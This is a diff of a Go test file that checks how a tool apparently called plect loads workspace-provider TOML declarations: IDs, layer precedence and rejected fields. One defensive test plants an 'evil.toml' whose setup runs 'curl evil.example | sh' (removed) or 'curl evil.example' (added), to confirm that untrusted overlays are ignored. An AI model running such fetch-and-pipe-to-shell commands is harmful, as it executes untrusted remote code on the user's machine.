@@ -7,25 +7,75 @@ import (
 	"testing"
 )
 
+func writeProviderDoc(t *testing.T, baseDir, name, body string) {
+	t.Helper()
+	writeFile(t, filepath.Join(baseDir, "workspaces", name+".toml"), body)
+}
+
+const providerSetupHook = `
+[github.setup]
+type    = "exec"
+command = "true"
+args    = ["setup", { from = "resource.id" }]
+`
+
 func TestLoadWorkspaceProviders_GlobalLayer(t *testing.T) {
 	baseDir := t.TempDir()
-	writeFile(t, filepath.Join(baseDir, "workspaces", "github.toml"), `
-match = '^https://github\.com/'
-name  = "x"
-setup = "echo '{\"workspace_dir\":\"/tmp/x\"}'"
-cleanup = "true"
-`)
-	cfg := &Config{BaseDir: baseDir}
-	got, err := cfg.LoadWorkspaceProviders()
+	writeProviderDoc(t, baseDir, "github", `
+[github]
+kind  = "workspace_provider"
+match = '^https://github\.com/(?P<owner>[^/]+)/(?P<repo>[^/]+)'
+name  = { expr = "match.owner + '/' + match.repo" }
+`+providerSetupHook)
+	got, err := (&Config{BaseDir: baseDir}).LoadWorkspaceProviders()
 	if err != nil {
 		t.Fatal(err)
 	}
-	p, ok := got["github"]
+	prov, ok := got["github"]
 	if !ok {
 		t.Fatalf("expected github workspace provider, got %+v", got)
 	}
-	if !p.HasResolver() || p.Setup == "" || p.Cleanup == "" {
-		t.Errorf("fields lost: %+v", p)
+	if prov.Setup == nil || prov.Name == nil || prov.Match == "" {
+		t.Errorf("fields lost: %+v", prov)
+	}
+	if !prov.HasResolver() {
+		t.Error("a provider declaring match and name has a resolver")
+	}
+	if prov.FromPlugin {
+		t.Error("a global-layer definition is not plugin-owned")
+	}
+}
+
+// The id is the declaration's table name, so one document may declare
+// several providers and none is named after the file.
+func TestLoadWorkspaceProviders_IDComesFromTheTableNotTheFilename(t *testing.T) {
+	baseDir := t.TempDir()
+	writeProviderDoc(t, baseDir, "anything", `
+[first]
+kind = "workspace_provider"
+
+[first.setup]
+type    = "exec"
+command = "true"
+
+[second]
+kind = "workspace_provider"
+
+[second.setup]
+type    = "exec"
+command = "true"
+`)
+	got, err := (&Config{BaseDir: baseDir}).LoadWorkspaceProviders()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, id := range []string{"first", "second"} {
+		if _, ok := got[id]; !ok {
+			t.Errorf("expected provider %q, got %v", id, got)
+		}
+	}
+	if _, ok := got["anything"]; ok {
+		t.Error("the filename must not become an id")
 	}
 }
 
@@ -33,97 +83,144 @@ func TestLoadWorkspaceProviders_GlobalOverridesPlugin(t *testing.T) {
 	pluginDir := t.TempDir()
 	baseDir := t.TempDir()
 	writeFile(t, filepath.Join(pluginDir, "config", "workspaces", "github.toml"), `
-setup = "echo plugin"
+[github]
+kind = "workspace_provider"
+
+[github.setup]
+type    = "exec"
+command = "plugin"
 `)
-	writeFile(t, filepath.Join(baseDir, "workspaces", "github.toml"), `
-setup = "echo global"
+	writeProviderDoc(t, baseDir, "github", `
+[github]
+kind = "workspace_provider"
+
+[github.setup]
+type    = "exec"
+command = "global"
 `)
-	cfg := &Config{BaseDir: baseDir, PluginDirs: []string{pluginDir}}
-	got, err := cfg.LoadWorkspaceProviders()
+	got, err := (&Config{BaseDir: baseDir, PluginDirs: []string{pluginDir}}).LoadWorkspaceProviders()
 	if err != nil {
 		t.Fatal(err)
 	}
-	if got["github"].Setup != "echo global" {
-		t.Errorf("Setup = %q, want global to win (deeper layer)", got["github"].Setup)
+	if got["github"].Setup.Command != "global" {
+		t.Errorf("Command = %q, want global to win (deeper layer)", got["github"].Setup.Command)
 	}
 }
 
 func TestLoadWorkspaceProviders_TwoPluginLayersSameIDFailsLoud(t *testing.T) {
 	pluginA := t.TempDir()
 	pluginB := t.TempDir()
-	writeFile(t, filepath.Join(pluginA, "config", "workspaces", "github.toml"), `setup = "echo a"`)
-	writeFile(t, filepath.Join(pluginB, "config", "workspaces", "github.toml"), `setup = "echo b"`)
-	cfg := &Config{PluginDirs: []string{pluginA, pluginB}}
+	for _, dir := range []string{pluginA, pluginB} {
+		writeFile(t, filepath.Join(dir, "config", "workspaces", "github.toml"), `
+[github]
+kind = "workspace_provider"
 
-	_, err := cfg.LoadWorkspaceProviders()
+[github.setup]
+type    = "exec"
+command = "true"
+`)
+	}
+	_, err := (&Config{PluginDirs: []string{pluginA, pluginB}}).LoadWorkspaceProviders()
 	if err == nil || !strings.Contains(err.Error(), "github") {
 		t.Fatalf("expected a same-id-across-plugin-layers error naming \"github\", got %v", err)
 	}
 }
 
-func TestLoadWorkspaceProviders_SetupRequired(t *testing.T) {
-	baseDir := t.TempDir()
-	writeFile(t, filepath.Join(baseDir, "workspaces", "broken.toml"), `
-cleanup = "true"
-`)
-	cfg := &Config{BaseDir: baseDir}
-	_, err := cfg.LoadWorkspaceProviders()
-	if err == nil || !strings.Contains(err.Error(), "setup") {
-		t.Fatalf("expected setup-required error, got %v", err)
+func TestLoadWorkspaceProviders_RejectedDeclarations(t *testing.T) {
+	tests := []struct {
+		name string
+		body string
+		want string
+	}{
+		{
+			name: "setup required",
+			body: "[p]\nkind = \"workspace_provider\"\n",
+			want: "setup",
+		},
+		{
+			name: "kind missing",
+			body: "[p]\nmatch = '^x'\n",
+			want: "kind",
+		},
+		{
+			name: "another kind under workspaces",
+			body: "[p]\nkind = \"channel\"\ntype = \"exec\"\ncommand = \"true\"\n",
+			want: "workspace_provider",
+		},
+		{
+			name: "match without name",
+			body: "[p]\nkind = \"workspace_provider\"\nmatch = '^x'\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n",
+			want: "declared together",
+		},
+		{
+			name: "name without match",
+			body: "[p]\nkind = \"workspace_provider\"\nname = \"n\"\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n",
+			want: "declared together",
+		},
+		{
+			name: "match does not compile",
+			body: "[p]\nkind = \"workspace_provider\"\nmatch = '('\nname = \"n\"\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n",
+			want: "does not compile as a regular expression",
+		},
+		{
+			name: "a field outside the provider surface",
+			body: "[p]\nkind = \"workspace_provider\"\nenvironment = \"docker\"\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n",
+			want: "environment",
+		},
+		{
+			name: "a name reading something other than a match capture",
+			body: "[p]\nkind = \"workspace_provider\"\nmatch = '^x'\nname = { from = \"resource.id\" }\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n",
+			want: "resource.id",
+		},
+		{
+			name: "a setup reading a root only cleanup offers",
+			body: "[p]\nkind = \"workspace_provider\"\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\nargs = [{ from = \"self.outputs.workspace_dir\" }]\n",
+			want: "self.outputs.workspace_dir",
+		},
+		{
+			name: "a subscribe reading a provider parameter",
+			body: "[p]\nkind = \"workspace_provider\"\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n\n[p.subscribe]\ntype = \"exec\"\ncommand = \"true\"\nargs = [{ from = \"inputs.x\" }]\n",
+			want: "inputs.x",
+		},
+		{
+			name: "the reserved workspace_dir output declared mutable",
+			body: "[p]\nkind = \"workspace_provider\"\n\n[p.setup]\ntype = \"exec\"\ncommand = \"true\"\n\n[p.outputs_schema.properties.workspace_dir]\ntype = \"string\"\nmutable = true\n",
+			want: "reserved",
+		},
 	}
-}
-
-func TestLoadWorkspaceProviders_ResolverPairEnforced(t *testing.T) {
-	baseDir := t.TempDir()
-	writeFile(t, filepath.Join(baseDir, "workspaces", "half.toml"), `
-match = '^x'
-setup = "echo '{}'"
-`)
-	cfg := &Config{BaseDir: baseDir}
-	_, err := cfg.LoadWorkspaceProviders()
-	if err == nil || !strings.Contains(err.Error(), "together") {
-		t.Fatalf("expected resolver-pair error, got %v", err)
-	}
-}
-
-func TestLoadWorkspaceProviders_WorkspaceDirMutableIsLoadError(t *testing.T) {
-	baseDir := t.TempDir()
-	writeFile(t, filepath.Join(baseDir, "workspaces", "evil.toml"), `
-setup = "echo '{}'"
-
-[outputs_schema.properties.workspace_dir]
-type    = "string"
-mutable = true
-`)
-	cfg := &Config{BaseDir: baseDir}
-	_, err := cfg.LoadWorkspaceProviders()
-	if err == nil || !strings.Contains(err.Error(), "reserved") {
-		t.Fatalf("expected reserved-workspace_dir error, got %v", err)
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			baseDir := t.TempDir()
+			writeProviderDoc(t, baseDir, "broken", tt.body)
+			_, err := (&Config{BaseDir: baseDir}).LoadWorkspaceProviders()
+			if err == nil {
+				t.Fatalf("expected a load error mentioning %q", tt.want)
+			}
+			if !strings.Contains(err.Error(), tt.want) {
+				t.Errorf("error does not mention %q: %v", tt.want, err)
+			}
+		})
 	}
 }
 
 func TestLoadWorkspaceProviders_NotInWorkspaceDirCascade(t *testing.T) {
-	// Workspace providers are trusted-base-layer only — a workspaces/ dir
-	// inside a workspace-dir overlay chain must never be picked up.
-	// LoadWorkspaceProviders takes no workspace-dir argument by design; this
-	// guards against someone re-adding it.
+	// Workspace providers are trusted-base-layer only: a workspaces/ dir
+	// inside a workspace-dir overlay chain must never be picked up, because
+	// setup must be resolvable before any workspace exists and it runs a
+	// process.
 	tmpHome := t.TempDir()
 	t.Setenv("HOME", tmpHome)
 	workspaceDirPath := filepath.Join(tmpHome, "workspace_dirs", "session")
 	writeFile(t, filepath.Join(workspaceDirPath, ".plect", "workspaces", "evil.toml"), `
-setup = "curl evil.example | sh"
+[evil]
+kind = "workspace_provider"
+
+[evil.setup]
+type    = "exec"
+command = "curl"
+args    = ["evil.example"]
 `)
-	if err := os.MkdirAll(filepath.Join(tmpHome, ".config", "plect"), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(tmpHome, ".config", "plect", "config.toml"), []byte(""), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	cfg, err := Load()
-	if err != nil {
-		t.Fatal(err)
-	}
-	got, err := cfg.LoadWorkspaceProviders()
+	got, err := (&Config{}).LoadWorkspaceProviders()
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -166,5 +263,61 @@ id = "r"
 	_, err = cfg.LoadWorkflows(workspaceDirPath)
 	if err == nil || !strings.Contains(err.Error(), "workspace_provider") {
 		t.Fatalf("expected workspace_provider redeclaration error, got %v", err)
+	}
+}
+
+// A provider's own contracts are checked at load: a session name reads its
+// own captures, and a cleanup reads its own declared outputs.
+func TestLoadWorkspaceProviders_ContractPathsAreChecked(t *testing.T) {
+	tests := []struct {
+		name string
+		body string
+		want string
+	}{
+		{
+			name: "a name naming a capture the match does not declare",
+			body: `[p]
+kind  = "workspace_provider"
+match = '^x/(?P<owner>[^/]+)$'
+name  = { expr = "match.owner + '/' + match.repo" }
+
+[p.setup]
+type    = "exec"
+command = "true"
+`,
+			want: "match.repo",
+		},
+		{
+			name: "a cleanup naming an output the schema does not declare",
+			body: `[p]
+kind = "workspace_provider"
+
+[p.setup]
+type    = "exec"
+command = "true"
+
+[p.cleanup]
+type    = "exec"
+command = "true"
+args    = [{ from = "self.outputs.branch" }]
+
+[p.outputs_schema]
+type = "object"
+
+[p.outputs_schema.properties]
+workspace_dir = { type = "string" }
+`,
+			want: "self.outputs.branch",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			baseDir := t.TempDir()
+			writeProviderDoc(t, baseDir, "p", tt.body)
+			_, err := (&Config{BaseDir: baseDir}).LoadWorkspaceProviders()
+			if err == nil || !strings.Contains(err.Error(), tt.want) {
+				t.Fatalf("expected a load error naming %q, got %v", tt.want, err)
+			}
+		})
 	}
 }
